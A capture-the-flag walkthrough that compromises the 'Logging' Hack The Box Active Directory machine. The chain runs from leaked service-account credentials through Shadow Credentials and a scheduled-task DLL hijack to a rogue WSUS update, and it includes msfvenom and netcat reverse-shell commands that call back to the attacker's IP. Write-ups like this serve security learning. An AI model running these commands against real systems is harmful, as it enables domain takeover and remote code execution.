
<img src="Images/Logging%20Logo.png" width="215" alt="Logging Logo">

# Attack Chain

```
Initial creds : wallace.everette:Welcome2026@
  └─► SMB Logs share → IdentitySync_Trace.log → svc_recovery:Em3rg3ncyPa$$2025
    └─► Update Password → svc_recovery:Em3rg3ncyPa$$2026
        └─► GenericWrite on MSA_HEALTH$ → Shadow Credentials (pywhisker)
            └─► PKINIT (gettgtpkinit) → AS-REP key → NT hash (getnthash)
                └─► Evil-Winrm as MSA_HEALTH$
                    └─► WinRM → monitor.ps1 → DLL Hijack via Settings_Update.zip
                        └─► Exploit Scheduled Task → jaylee.clifton (shell)
                            └─► Ticket WSUS → wsus.logging.htb DNS not updated
                                └─► Request Certificate → cert for wsus.logging.htb
                                    └─► DNS Poisoning → wsus.logging.htb → tun0
                                        └─► Rogue WSUS HTTPS → PsExec + nc.exe
                                            └─► nt authority\system ✅
```
# Sommaire

- [Enumeration](#enumeration)
	- [Nmap](#nmap)
	- [Bloodhound](#bloodhound)
	- [Request TGS for user with SPN](#request-tgs-for-user-with-spn)
	- [Check ASREPRoast Accounts](#check-asreproast-accounts)
- [SMB Shares](#smb-shares)
	- [Credentials Discovery](#credentials-discovery)
	- [Testing validity](#testing-validity)
	- [Valid Password](#valid-password)
- [Enumerate svc_recovery rights](#enumerate-svc_recovery-rights)
	- [Shadow Credentials](#shadow-credentials)
	- [Craft TGT for MSA_HEALTH$](#craft-tgt-for-msa_health)
	- [Uncover NTLM hash](#uncover-ntlm-hash)
	- [Shell as MSA_HEALTH$](#shell-as-msa_health)
- [Lateral Movement](#lateral-movement)
	- [monitor.ps1](#monitorps1)
	- [Read the task](#read-the-task)
	- [Reverse Enginering exe](#reverse-enginering-exe)
	- [Exploit the vulnerability](#exploit-the-vulnerability)
	- [Shell as jaylee.clifton](#shell-as-jayleeclifton)
- [Privilege Escalation](#privilege-escalation)
	- [Ticket WSUS](#ticket-wsus)
	- [Request TGT for jaylee.clifton](#request-tgt-for-jayleeclifton)
	- [Enumerate Certificates Templates](#enumerate-certificates-templates)
	- [Request UpdateSrv Certificate](#request-updatesrv-certificate)
	- [Preparation](#preparation)
	- [DNS Poisoning](#dns-poisoning)
	- [Shell as SYSTEM](#shell-as-system)

--- 

As is common in real life pentests, you will start the Logging box with credentials for the following account `wallace.everette` / `Welcome2026@`
# Enumeration

### Nmap

```
nmap -sVC 10.129.21.36 -oN scan.txt                            Starting Nmap 7.93 

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-19 02:27:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T02:28:29+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
|_ssl-date: 2026-04-19T02:28:29+00:00; +7h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T02:28:29+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-17T03:20:01
|_Not valid after:  2106-04-17T03:20:01
|_ssl-date: 2026-04-19T02:28:28+00:00; +7h00m01s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time:
|   date: 2026-04-19T02:28:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.24 seconds
```

We are facing an AD since we can see that there is kerberos along ldap and a lot of service linked to AD.
The scan reveal the FQDN of the target and the domain. Let's add both to `/etc/hosts`.

```
echo 10.129.21.36 logging.htb dc01.logging.htb | tee -a /etc/hosts
```

### Bloodhound

Since we have credentials, we can enumerate the relations used in the target and try to find vulnerabilities that can be exploited.

First we have to be on the same timeline as the target.

```
faketime "$(rdate -n 10.129.*.* -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

And we can collect data

```
bloodhound.py --zip -c All -d "logging.htb" -u "wallace.everette" -p "Welcome2026@" -ns "10.129.21.36"
```

After the import, we notice that our user doesn't have much privilege.

### Request TGS for user with SPN

Let's see if our user can see if there is account with SPN set on and try to request a TGS.

```
GetUserSPNs.py -dc-ip "10.129.21.36" "logging.htb"/"wallace.everette":"Welcome2026@"
Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

No entries found!
```

There is none.

### Check ASREPRoast Accounts

We can also look for ASREPRoastable account.

```
GetNPUsers.py -dc-ip "10.129.21.36" "logging.htb"/"wallace.everette":"Welcome2026@"
Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

No entries found!
```

No results here either.

# SMB Shares

Let's move on to the SMB Shares now to see what's accessible for our user.

```
nxc smb "10.129.21.36" -u "wallace.everette" -p "Welcome2026@" --shares

[*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)

[+] logging.htb\wallace.everette:Welcome2026@

[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
Logs            READ
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
WSUSTemp                        A network share used by Local Publis
```

We have **READ** access to the `Logs` share which is not a common share. Let's connect to it with `smbclient`.

```
smbclient -U 'wallace.everette' //10.129.21.36/Logs
Password for [WORKGROUP\wallace.everette]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr 17 01:10:09 2026
  ..                                  D        0  Fri Apr 17 01:10:09 2026
  Audit_Heartbeat.log                 A     1294  Fri Apr 17 01:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Fri Apr 17 01:10:09 2026
  Service_State.log                   A      468  Fri Apr 17 01:10:09 2026
  TaskMonitor.log                     A     1170  Fri Apr 17 01:10:09 2026

                6657279 blocks of size 4096. 1045078 blocks available
smb: \> mget *
Get file Audit_Heartbeat.log? y
ygetting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log (9.7 KiloBytes/sec) (average 9.7 KiloBytes/sec)
Get file IdentitySync_Trace_20260219.log?
ygetting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log (62.8 KiloBytes/sec) (average 36.5 KiloBytes/sec)
Get file Service_State.log?
ygetting file \Service_State.log of size 468 as Service_State.log (3.7 KiloBytes/sec) (average 25.9 KiloBytes/sec)
Get file TaskMonitor.log?
ygetting file \TaskMonitor.log of size 1170 as TaskMonitor.log (8.7 KiloBytes/sec) (average 21.5 KiloBytes/sec)

smb: \> exit
```

We have access to various log file which we can inspect on our machine.

### Credentials Discovery

In the following log, we find an interesting entry.

```
cat IdentitySync_Trace_20260219.log 

<SNIP>

[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
   at logging.IdentitySync.Engine.LdapProvider.Connect()
   --- Server Error Details ---
   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
   Win32 Error: 49 (Invalid Credentials)
   ----------------------------

<SNIP>
```

There are the credentials in cleartext `svc_recovery`:`Em3rg3ncyPa$$2025`. Let's check if the account is valid.

### Testing validity

We can use `nxc` to check if the account match with the password.

```
nxc smb "10.129.21.36" -u "svc_recovery" -p 'Em3rg3ncyPa$$2025'
[*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.129.21.36    445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
```

It's a service account so we are facing the error `STATUS_ACCOUNT_RESTRICTION` to prevent it to access shares of the target.

To bypass the restriction, we can authenticate with kerberos using the flag `-k` and specifying the SPN of the target instead of the IP.

```
nxc smb dc01.logging.htb -u "svc_recovery" -p 'Em3rg3ncyPa$$2025' -k
SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)

[-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 KDC_ERR_PREAUTH_FAILED
```

The password is not valid.
### Valid Password

Since our given password ends up with `2026` and we notice that the password of `svc_recovery` ends up with `2025`, we can maybe assume that the password got updated with the current year and that's why the login of the account prompted as failed in the log.

Let's try that theory.

```
nxc smb dc01.logging.htb -u "svc_recovery" -p 'Em3rg3ncyPa$$2026' -k
SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)

[+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026
```

It worked, so we got the valid credentials `svc_recovery`:`Em3rg3ncyPa$$2026`.

# Enumerate svc_recovery rights

Let's get back to bloodhound and look for eventuals privilege on other nodes.

![svc_recovery rights](Images/svc_recovery%20rights.png)

We notice that `svc_recovery` has `Generic Write` on the MSA account `MSA_HEALTH$`. Let's abuse that right.
### Shadow Credentials

In order to exploit `Generic Write`, we can use the technique called **Shadow Credentials** which consists of injecting a malicious certificate in the attribute `msDS-KeyCredentialLink` of the target in order to be able to authenticate with that user on the target and extract its NTLM hash.

```
pywhisker -d "logging.htb" -u "svc_recovery" -p 'Em3rg3ncyPa$$2026' -k --dc-ip "10.129.21.36" --target "MSA_HEALTH$" --action "add"
[*] Searching for the target account
[*] Target user found: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 2d60f0e7-a19e-e7ec-0008-82d234590ee0
[*] Updating the msDS-KeyCredentialLink attribute of MSA_HEALTH$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: xN1gFGGP.pfx
/root/.local/share/pipx/venvs/pywhisker/lib/python3.11/site-packages/pywhisker/pywhisker.py:54: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
[+] PFX exportiert nach: xN1gFGGP.pfx
[i] Passwort für PFX: 5M79qlpxDtrI4uYfb9wM
[+] Saved PFX (#PKCS12) certificate & key at path: xN1gFGGP.pfx
[*] Must be used with password: 5M79qlpxDtrI4uYfb9wM
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

### Craft TGT for MSA_HEALTH$

Now we can request a TGT for the user `MSA_HEALTH$` using `gettgtpkinit.py`.

```
gettgtpkinit.py -cert-pfx xN1gFGGP.pfx -pfx-pass '5M79qlpxDtrI4uYfb9wM' "logging.htb"/'MSA_HEALTH$' MSA_HEALTH$_TGT.ccache
2026-04-19 05:31:11,546 minikerberos INFO     Loading certificate and key from file
2026-04-19 05:31:11,563 minikerberos INFO     Requesting TGT
2026-04-19 05:31:11,634 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-04-19 05:31:11,634 minikerberos INFO     81e30bc80dd338f7a80c78059b0836591df208c64a5706a74d2727da31992214
2026-04-19 05:31:11,638 minikerberos INFO     Saved TGT to file
```

We can notice that the output contains the RC4 hash of the account.
### Uncover NTLM hash

Using the AS-REP encryption key obtained during the PKINIT process, we can decrypt the PAC to recover the NT hash of `MSA_HEALTH$`.

```
getnthash.py -key '81e30bc80dd338f7a80c78059b0836591df208c64a5706a74d2727da31992214' logging.htb/MSA_HEALTH$ -dc-ip 10.129.21.36
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
603fc24ee01a9409f83c9d1d701485c5
```

### Shell as MSA_HEALTH$

Now that we got the hash, we can test and connect on the target with `evil-winrm` since that user has `PSRemote` on the target.

```
nxc smb dc01.logging.htb -u 'MSA_HEALTH$' -H '603fc24ee01a9409f83c9d1d701485c5'
[*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)

[+] logging.htb\MSA_HEALTH$:603fc24ee01a9409f83c9d1d701485c5

[Apr 19, 2026 - 05:35:42 (CEST)] exegol-htb /workspace # evil-winrm -i 10.129.*.* -u 'MSA_HEALTH$' -H '603fc24ee01a9409f83c9d1d701485c5'

*Evil-WinRM* PS C:\Users\msa_health$\Documents>
```

# Lateral Movement

We got a foothold on the target, let's look for potential vectors to perform lateral movement.

### monitor.ps1

Under `C:\Users\msa_health$\Documents` we notice the following `.ps1` script.

```
cat "C:/Users/msa_health$/Documents/monitor.ps1"
<#
.SYNOPSIS
    Monitors the status of the "UpdateChecker Agent" scheduled task.
    Uses COM interface to avoid CIM/WMI permission issues.
#>

$TaskName = "UpdateChecker Agent"
$LogPath = "C:\Share\Logs\TaskMonitor.log"
$Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

try {
    $service = New-Object -ComObject "Schedule.Service"
    $service.Connect()
    $task = $service.GetFolder("\").GetTask($TaskName)

    $State = switch ($task.State) {
        1 { "Disabled" }
        2 { "Queued" }
        3 { "Ready" }
        4 { "Running" }
        5 { "Disabled" }
        6 { "Unknown" }
        default { "Unknown" }
    }

    if ($State -ne "Ready" -and $State -ne "Running") {
        $Message = "[$Timestamp] WARN  - Task [$TaskName] is in an unexpected state: $State"
    }
    else {
        $Message = "[$Timestamp] INFO  - Task [$TaskName] health check: OK (State: $State)"
    }
}
catch {
    $Message = "[$Timestamp] ERROR - Failed to query task [$TaskName]. Exception: $($_.Exception.Message)"
}

Add-Content -Path $LogPath -Value $Message
```

### Read the task

We can't read the task using `shtasks` or `Get-ScheduledTask`. In order to bypass these restriction, we can use the following technique and print the details in an xml format.

```
*Evil-WinRM* PS C:\Users\msa_health$\Documents> $service = New-Object -ComObject "Schedule.Service"

*Evil-WinRM* PS C:\Users\msa_health$\Documents> $service.Connect()

*Evil-WinRM* PS C:\Users\msa_health$\Documents> $task = $service.GetFolder("\").GetTask("UpdateChecker Agent")

*Evil-WinRM* PS C:\Users\msa_health$\Documents> $task.Xml

<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2026-04-16T16:39:34.3280175</Date>
    <Author>logging\Administrator</Author>
    <URI>\UpdateChecker Agent</URI>
  </RegistrationInfo>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-4020823815-2796529489-1682170552-2105</UserId>
      <LogonType>Password</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
  </Settings>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2026-04-16T16:38:15</StartBoundary>
      <Repetition>
        <Interval>PT3M</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>"C:\Program Files\UpdateMonitor\UpdateMonitor.exe"</Command>
      <Arguments>500 /scan=3 /autofix=true</Arguments>
    </Exec>
  </Actions>
</Task>
```
### Reverse Enginering exe

From the xml outputs, we notice that the task runs the executable `C:\Program Files\UpdateMonitor\UpdateMonitor.exe`.

Let's download the file and reverse the file to look for more information.

```
*Evil-WinRM* PS C:\Users\msa_health$\Documents> download 'C:\Program Files\UpdateMonitor\UpdateMonitor.exe'
```

We can use `ilspycmd` on Linux in order to extract the source code.

```
ilspycmd UpdateMonitor.exe > source.cs
```

Let's look what's inside.

```
cat source.cs

<SNIP>
{
                string path = "C:\\ProgramData\\UpdateMonitor\\Logs\\monitor.log";
                string text = "C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip";
                string text2 = "C:\\Program Files\\UpdateMonitor\\bin\\";
                string text3 = "settings_update.dll";
                string text4 = Path.Combine(text2, text3);
                Directory.CreateDirectory(Path.GetDirectoryName(path));
                CleanupLogs(path, 90);
                Log(path, "Starting Sentinel Update Check...");
                Log(path, "Checking for update on core server...");
                Log(path, "Info: Core did not find file Settings_Update.zip");
                Log(path, "Last status: File not found on core");
                Log(path, "Checking for update on local server...");
                if (File.Exists(text))
                {
                        try
                        {
                                if (File.Exists(text4))
                                {
                                        File.Delete(text4);
                                }
                                ZipFile.ExtractToDirectory(text, text2);
                                Log(path, "Successfully unzipped update to " + text2);
                        }
                        catch (IOException ex)
                        {
                                Log(path, "Update failed: " + ex.Message);
                        }
                        catch (Exception ex2)
                        {
                                Log(path, "Update failed: " + ex2.Message);
                        }
                }
                else
                {
                        Log(path, "No updates found locally: C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip.");
                }
                Log(path, "Loading update applier: " + text4);
                IntPtr intPtr = LoadLibrary(text4);
                if (intPtr == IntPtr.Zero)
                {
                        int lastWin32Error = Marshal.GetLastWin32Error();
                        Log(path, $"Failed to load {text3}. Error code: {lastWin32Error}");
                        Log(path, "Update check completed.");
                        return;
                }
<SNIP>
```

The executable does the following

1. It will check if `C:\ProgramData\UpdateMonitor\Settings_Update.zip` exist
2. If it finds it, it will extract it to `C:\Program Files\UpdateMonitor\bin\`
3. Then it will launch the extracted DLL

It will also write the result in a log file which we can check and look for the task's frequency.

```
*Evil-WinRM* PS C:\Users\msa_health$\Documents> cat "C:\ProgramData\UpdateMonitor\Logs\monitor.log" -tail 10
[2026-04-19 09:23:16] Checking for update on local server...
[2026-04-19 09:23:16] Update failed: Access to the path 'C:\Program Files\UpdateMonitor\bin\settings_update.dll' is denied.
[2026-04-19 09:23:16] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-19 09:26:16] Starting Sentinel Update Check...
[2026-04-19 09:26:16] Checking for update on core server...
[2026-04-19 09:26:16] Info: Core did not find file Settings_Update.zip
[2026-04-19 09:26:16] Last status: File not found on core
[2026-04-19 09:26:16] Checking for update on local server...
[2026-04-19 09:26:16] Update failed: Access to the path 'C:\Program Files\UpdateMonitor\bin\settings_update.dll' is denied.
[2026-04-19 09:26:16] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
```

The task runs every 3 minutes.

### Exploit the vulnerability

To exploit the task, since any user can write to `C:\ProgramData`, we can put a malicious dll in order to get a reverse shell when the task executes.

First, we create a DLL reverse shell using `msfvenom`.

```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f dll -o settings_update.dll
```

We zip the files into an archive we will call `Settings_Update.zip` as required from the executable.

```
zip Settings_Update.zip settings_update.dll
```

And we put it in the path where it will be requested by the task.

```
*Evil-WinRM* PS C:\Users\msa_health$\Documents> upload Settings_Update.zip "C:\ProgramData\UpdateMonitor\Settings_Update.zip"
```

### Shell as jaylee.clifton

We need to wait 3 minutes now to see if we get a connection back on our reverse shell.

```
penelope -i tun0 -p 443
[+] Listening for reverse shells on 10.10.14.97:443
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from DC01~10.129.21.91-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍️ Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D
[+] Logging to /root/.penelope/sessions/DC01~10.129.21.91-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_04_19-11_35_17-093.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32> whoami

jaylee.clifton
```

We succesfully got a reverse shell as `jaylee.clifton`.

# Privilege Escalation

We got access to another user but we don't have administrative rights yet.
Bloodhound doesn't give us path to exploit so let's look from the target system.
### Ticket WSUS

Under `C:\Users\jaylee.clifton\Documents\Ticket` there is an `.htlm` file appearing to be an Incident. Let's download it and investigate it from our machine.


![WSUS Ticket](Images/WSUS%20Ticket.png)
The tickets give us valuable information. There is a WSUS service running, and it has the name `wsus.logging.htb`. And the most important, the DNS is not updated so it means we could poison the DNS records on the target, perform a MITM attack, and deploy a malicious update on the target.


We can also check where the WSUS server is located using this command.

```
PS C:\Users\jaylee.clifton\Documents\Tickets> reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    wuserver    REG_SZ    https://wsus.logging.htb:8531
```

The WSUS server runs over **https** on the port **8531**.

Since the WSUS server communicates over HTTPS, simply poisoning the DNS won't be enough. The target will verify the SSL certificate. This means our next objective is to find a way to forge a valid certificate for `wsus.logging.htb` trusted by the domain. 

### Request TGT for jaylee.clifton

Before proceeding, we should try to uncover the password of `jaylee.clifton`, or get its TGT to authenticate with kerberos.

Since I couldn't find the password, I imported `Rubeus.exe` to the target.

I started a smb server using `smbserver.py` with credentials because the **target's policy prevents unauthenticated connections to** external shares.

```
smbserver.py -smb2support share . -username hacked -password hacked
```

We must specify now the share used and the credentials.

```
PS C:\Users\jaylee.clifton\Documents>net use \\10.10.14.97\share /user:hacked hacked
```

And we can copy `Rubeus.exe` to the target.

```
PS C:\Users\jaylee.clifton\Documents> copy \\10.10.14.97\share\Rubeus.exe Rubeus.exe
```

We can now request a TGT for our user.

```
PS C:\Users\jaylee.clifton\Documents> .\Rubeus.exe tgtdeleg /nowrap
```

From the output of the above, we should get a base64 string that can be put inside a `.kirbi` file.

```
echo '<BASE64>' | base64 -d > jaylee.kirbi
```

Now we can convert it to a `.ccache` file which can be used for Kerberos.

```
ticketConverter.py jaylee.kirbi jaylee.ccache 
```

And we can add it to the variable `KRB5CCNAME`.

```
export KRB5CCNAME=jaylee.ccache
```

### Enumerate Certificates Templates

Let's see now if `jaylee.clifton` has any specific rights over Active Directory Certificate Services (AD CS).

```
certipy find -u jaylee.clifton@logging.htb -k -no-pass -dc-ip 10.129.21.91 -target dc01.logging.htb
```

```
cat 20260419213333_Certipy.txt | grep -C21 'LOGGING.HTB\\IT'
    Template Name                       : UpdateSrv
    Display Name                        : UpdateSrv
    Certificate Authorities             : logging-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-04-17T00:41:06+00:00
    Template Last Modified              : 2026-04-17T00:41:07+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOGGING.HTB\IT
                                          LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOGGING.HTB\Administrator
        Full Control Principals         : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Write Owner Principals          : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Write Dacl Principals           : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
        Write Property Enroll           : LOGGING.HTB\Domain Admins
                                          LOGGING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOGGING.HTB\IT
  1
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : logging-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 29219 days
```

We notice that the certificate template **UpdateSrv** is highly vulnerable and perfectly fits our needs. Here is why:

- **Enrollment Rights:** Members of the `IT` group can enroll in it, and Jaylee is a member of this group.
- **Enrollee Supplies Subject:** It is set to `True`. This means we can supply any Arbitrary Subject Alternative Name (SAN) we want. We can request a certificate for any DNS name.
- **Extended Key Usage:** It is set to `Server Authentication`. While we cannot use it to authenticate as an Administrator (no Client Authentication), it is exactly what we need to host a rogue HTTPS server.

### Request UpdateSrv Certificate

By combining these misconfigurations, we can request a valid SSL Server certificate for the WSUS server domain (`wsus.logging.htb`) signed by the internal CA. 

Because it is signed by the internal CA, all Windows clients in the domain will naturally trust it.

```
certipy req -u 'jaylee.clifton' -k -no-pass -target dc01.logging.htb -template UpdateSrv -ca logging-DC01-CA -dns wsus.logging.htb
```

We receive a `.pfx` file. To use it with our rogue WSUS server, we need to extract the certificate and the private key into a `.pem` file.

```
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes
Enter Import Password: <blank>
```

### Preparation

To perform the MITM attack against the HTTPS WSUS service, we will use a tool called `wsuks`.
We can install with the help of this [Installation](https://pypi.org/project/wsuks/) or [this](https://github.com/NeffIsBack/wsuks).

```
apt install pipx python3-nftables
pipx install wsuks --system-site-packages
```

### DNS Poisoning

We need to poison the DNS records of the target for the attack to work. We need to associate our IP with `wsus.logging.htb` so the target will check for updates on our server and we will be able to push the malicious update on the target.

```
dnstool.py -u 'logging.htb\jaylee.clifton' -p "" -k -a add -r wsus -d 10.10.14.97 -dns-ip 10.129.*.* dc01.logging.htb
```
### Shell as SYSTEM

To bypass Windows Defender, I used the Microsoft-signed binary `PsExec64.exe` as our update payload. PsExec will then execute `nc.exe` as the `SYSTEM` user.

```
wsuks --serve-only -I tun0 -p 8531 --tls-cert wsus.pem -e wsuks/wsuks/executables/PsExec64.exe -c "-accepteula -s C:\Windows\Temp\nc.exe 10.10.14.97 443 -e cmd"
```

```
[+] Got reverse shell from DC01~10.129.21.117-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍️ Assigned SessionID <2>
PS C:\Windows\Temp>
[!] Session detached ⇲

(Penelope)─(Session [1])> sessions 2
[+] Added readline support...
[+] Interacting with session [2], Shell Type: Readline, Menu key: Ctrl-D
[+] Logging to /root/.penelope/sessions/DC01~10.129.21.117-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_04_19-17_55_53-165.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
nt authority\system
```

We got a reverse shell as `nt authority\system`.

Machine successfully rooted.